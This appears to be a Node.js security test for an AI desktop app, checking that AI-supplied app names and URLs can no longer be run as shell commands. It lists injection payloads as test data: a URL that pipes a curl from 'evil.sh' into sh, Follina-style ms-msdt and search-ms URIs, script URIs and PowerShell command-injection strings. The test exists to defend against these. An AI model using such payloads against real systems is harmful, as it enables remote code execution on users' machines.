// Can a hostile app name or URL execute code?
//
// Two paths took text the AI wrote and handed it to a shell: openInChrome
// (from the AI's open_url) and closeApp (from close_app). Both now pass the
// text as DATA — an argument or an environment variable — and never as part of
// a command. This proves it rather than asserting it.
//
// On Windows it runs the real PowerShell mechanism, with a harmless action in
// place of closing windows, against payloads that would create a marker file
// if they ever ran. On every platform it checks the source: no shell string is
// built from the name or the URL any more.

const fs = require('fs');
const os = require('os');
const path = require('path');
const { execFile } = require('child_process');

const SRC = fs.readFileSync(path.join(__dirname, '..', 'src', 'services', 'commands.js'), 'utf8');

let pass = 0, fail = 0;
const ok = (name, cond, extra) => {
  if (cond) pass++; else { fail++; console.log('FAIL ' + name + (extra ? ' — ' + extra : '')); }
};

function body(name) {
  const at = SRC.indexOf('function ' + name + '(');
  let d = 0, started = false;
  for (let i = at; i < SRC.length; i++) {
    if (SRC[i] === '{') { d++; started = true; }
    if (SRC[i] === '}') { d--; if (started && d === 0) return SRC.slice(at, i + 1); }
  }
  return '';
}
// Comments removed, so the explanation of the old bug is not mistaken for it.
const code = (s) => s.replace(/\/\/.*$/gm, '');

(async () => {
  /* ── Source: nothing builds a shell command from the hostile text ──────── */
  const close = code(body('closeApp'));
  ok('closeApp exists', close.length > 0);
  ok('closeApp no longer calls exec()', !/\bexec\(/.test(close));
  ok('closeApp passes the name to PowerShell as an environment variable', /CALLISTO_CLOSE:/.test(close));
  ok('closeApp passes the name to osascript as an argument', /item 1 of argv/.test(close));
  ok('the name is not pasted into the AppleScript text', !/tell application "\$\{/.test(close));

  const focus = code(body('focusApp'));
  ok('focusApp passes the name as an argument on Mac', /item 1 of argv/.test(focus));
  ok('focusApp no longer pastes the name into a shell string', !/process "\$\{/.test(focus));

  const chrome = code(body('openInChrome'));
  ok('openInChrome no longer calls exec()', !/\bexec\(/.test(chrome));
  ok('openInChrome uses execFile', /execFile\(/.test(chrome));
  ok('openInChrome refuses non-web addresses', /safeWebUrl\(/.test(chrome));
  ok('the old shell-string builder is gone', !/getChromeCommands/.test(SRC));

  /* ── safeWebUrl: only http and https get through ───────────────────────── */
  const swu = new Function('URL', body('safeWebUrl') + '; return safeWebUrl;')(URL);
  for (const [u, want] of [
    ['https://callistoai.net', true],
    ['http://example.com/page?q=1', true],
    ['https://example.com/$(curl evil.sh|sh)', true],     // allowed as a URL, harmless with no shell
    ['javascript:alert(1)', false],
    ['file:///C:/Windows/System32/calc.exe', false],
    ['ms-msdt:/id PCWDiagnostic /skip force', false],     // "Follina"
    ['search-ms:query=x&crumb=location:\\\\evil\\share', false],
    ['vbscript:msgbox(1)', false],
    ['data:text/html,<script>alert(1)</script>', false],
    ['not a url at all', false],
    ['', false],
  ]) {
    const got = !!swu(u);
    ok((want ? 'allows ' : 'refuses ') + u.slice(0, 50), got === want, 'got ' + got);
  }

  /* ── Windows: run the real mechanism against real payloads ─────────────── */
  if (process.platform !== 'win32') {
    console.log('  (not Windows — PowerShell execution check skipped; source checks above still apply)');
  } else {
    const marker = path.join(os.tmpdir(), 'callisto-pwned-' + Date.now() + '.txt');
    const m = marker.replace(/\\/g, '\\\\');
    const PAYLOADS = [
      `x'; New-Item -Path '${marker}' -ItemType File; '`,
      `x"; New-Item -Path "${marker}" -ItemType File; "`,
      `$(New-Item -Path '${marker}' -ItemType File)`,
      '`$(New-Item -Path ' + marker + ')',
      `x*; New-Item ${marker}`,
      `x & echo pwned > "${marker}"`,
      `x | Out-File ${marker}`,
    ];
    // The same script closeApp runs, with the window-closing swapped for a
    // harmless echo of what matched, so this test closes nothing.
    const ps = 'Get-Process | Where-Object { ($_.ProcessName -like ("*" + $env:CALLISTO_CLOSE + "*")) } '
      + '| Select-Object -First 0 ; Write-Output ("matched-on:" + $env:CALLISTO_CLOSE)';

    for (const p of PAYLOADS) {
      const literal = p.replace(/[[\]*?`]/g, (c) => '`' + c);
      const out = await new Promise((resolve) => {
        execFile('powershell', ['-NoProfile', '-NonInteractive', '-Command', ps], {
          timeout: 15000, windowsHide: true, env: { ...process.env, CALLISTO_CLOSE: literal },
        }, (err, stdout) => resolve(String(stdout || '')));
      });
      const ran = fs.existsSync(marker);
      ok('PowerShell treats this as data: ' + p.slice(0, 44), !ran, 'THE PAYLOAD EXECUTED — marker file created');
      ok('… and the name arrives intact', out.includes('matched-on:'), out.slice(0, 80));
      if (ran) { try { fs.unlinkSync(marker); } catch (_) {} }
    }
  }

  console.log('\n  ' + pass + '/' + (pass + fail) + ' passed');
  process.exitCode = fail ? 1 : 0;
})();
